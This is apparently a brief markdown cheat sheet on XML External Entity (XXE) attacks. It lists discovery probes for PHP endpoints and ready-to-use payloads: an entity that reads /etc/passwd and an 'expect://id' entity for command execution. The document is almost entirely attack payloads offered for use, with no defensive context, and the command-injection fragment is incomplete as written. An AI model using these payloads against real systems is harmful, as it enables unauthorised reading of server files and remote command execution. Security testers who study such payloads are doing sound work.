# XXE

## Concept
```<!Entity nooranet SYSTEM “file:///etc/passwd”>```

## Discovery
- Find ```xml``` in error of these payloads
  - ```.php?xml=>```
  - ```.php?xml=/>```

## Exploitation
- LFI
```XML
<!DOCTYPE foo[
<!Entity xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```
- Command Injection
```XML
<!Entity xxe SYSTEM "expect://id">]>
```
